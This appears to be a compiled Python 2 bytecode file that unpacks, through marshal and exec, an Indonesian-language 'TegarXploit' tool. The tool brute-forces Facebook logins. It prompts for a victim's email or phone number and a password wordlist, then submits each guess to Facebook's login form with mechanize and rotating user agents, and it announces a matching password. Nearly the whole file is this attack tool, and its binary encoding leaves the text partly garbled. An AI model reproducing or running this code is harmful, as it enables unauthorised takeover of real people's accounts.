ó
ô¯"_c           @   s!   d  d l  Z  e  j d  d Ud S(   iÿÿÿÿNs~  c           @   sÁ  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z e j d  e  j d  d   Z d GHe j d  d GHe d  e j d  e  j d  e  j d	  d
 Z	 e	 GHd GHe j d  d GHe j d  d GHe j d  d GHe j d  e
 d  Z e d k re  j d  e j d  d GHe j d  d GHe j d  e  j d  d Z	 e	 GHe e d   Z e j d  e e d   Z d Z d' g Z d   Z d   Z d   Z e d k re   qn  e d k rLe j d  d  GHe  j d!  e j d  e  j d  n  e d" k rue j d  e  j d#  n  e d$ k r½e j d  d% GHe j d  e  j d  e  j d&  n  d S((   iÿÿÿÿN(   t   sleepi   t   clearc         C   sM   xF |  d D]: } t  j j |  t  j j   t j t j   d  q Wd  S(   Ns   
g¹?(   t   syst   stdoutt   writet   flusht   timeR    t   random(   t   st   c(    (    t    t   mengetik   s    s       WELCOME HACKERSt    s@   [1;92mSelamat Datang Hackers Di Tools [1;97mTegar[1;91mXploitsF   xdg-open https://m.youtube.com/channel/UC17ehoE84IzPzzipMddupSQ/videoss
  
[1;92mâââ  âââ
[1;92mââââââââ    [1;94mâââââââââââââââââââââââââââ
[1;92m ââââââ     [1;94mâ [1;97mAuthor  : [1;97mTegar[1;91mXploit   â
[1;92m ââââââ     [1;94mâ [1;97mYoutube : CYTOM         â
[1;92mââââ âââ    [1;94mâ [1;91mÂ© No MasTer Brother Â©   â
[1;92mâââ  âââ    [1;94mâââââââââââââââââââââââââââ
s+   [1;97m[[1;92m1[1;97m] [1;93mRun programg333333ã?s.   [1;97m[[1;92m2[1;97m] [1;93mHubungi Authors*   [1;97m[[1;92m3[1;97m] [1;93mPengertians$   [1;97m[[1;92m4[1;97m] [1;93mExits   pilih nomor: i   s%   Di Bagian Id masukan Nomor Atau Emails'   Di Bagian Wordlist Masukan password.txti   sÅ  
   [1;97m     âââââ
   [1;97m     âââââ     âââââââââââââââââââââââââ
   [1;92m    âââââââ [1;91m   â       [1;92mTegarXploit     [1;91mâ
   [1;93m    âââââââ [1;97m   â  [1;93mBrute-Force Attack   [1;97mâ
   [1;91m    âââââââ    âââââââââââââââââââââââââ
   [1;92m
    s   Id Korban: g      ð?s
   Wordlist: s#   https://www.facebook.com/login.php?sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1c          C   s   t  j   a t j   }  t j t  t j t  t j	 |   t j
 t  t j t  t j t  j j   d d t   d GHd  S(   Nt   max_timei   s   [!] [1;91mTidak Menemukan (   t	   mechanizet   Browsert   brt	   cookielibt   LWPCookieJart   set_handle_robotst   Falset   set_handle_redirectt   Truet   set_cookiejart   set_handle_equivt   set_handle_referert   set_handle_refresht   _httpt   HTTPRefreshProcessort   search(   t   cj(    (    R
   t   mainF   s    c         C   sÌ   t  j j d j |    t  j j   d t j t  f g t _	 t j
 t  } t j d d  t t j d <|  t j d <t j   } | j   } | t k rÈ d | k rÈ d j |   GHt  j d	  n  d  S(
   Ns1   [1;91m[[1;93m![1;91m] [1;92mMencoba ~~Â» {}
s
   User-agentt   nri    t   emailt   passt   login_attempts4   

[1;97m[[1;92m+[1;97m [1;93mPassowrd Cocok = {}i   (   R   R   R   t   formatR   R   t   choicet
   useragentsR   t
   addheaderst   opent   logint   select_formR!   t   formt   submitt   geturlt   exit(   t   passwordt   sitet   subt   log(    (    R
   t   bruteS   s    c          C   s@   t  t d  }  x* |  D]" a t j d d  a t t  q Wd  S(   Nt   rs   
R
   (   R(   t   wordlistR/   t   replaceR3   (   t	   passwords(    (    R
   R   a   s    t   __main__s   Mohon Tunggu .....s%   xdg-open https://wa.me/+6285703474394i   s£   xdg-open https://www.logique.co.id/blog/2020/02/12/apa-itu-brute-force/#:~:text=Serangan%20brute%20force%20merupakan%20upaya,dari%20jenis%20serangan%20yang%20lain.i   s#   Terima kasih Telah Datang dan pergiR.   (   sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1(   t   osR   R   R   R   R   R    t   systemR   t   bannert   inputt   piliht   strt	   raw_inputR!   R5   R)   R&   R   R3   R   t   __name__(    (    (    R
   t   <module>   s~   	
				(   t   marshalt   loads(    (    (    s   /sdcard/facebook_.pyt   <module>   s   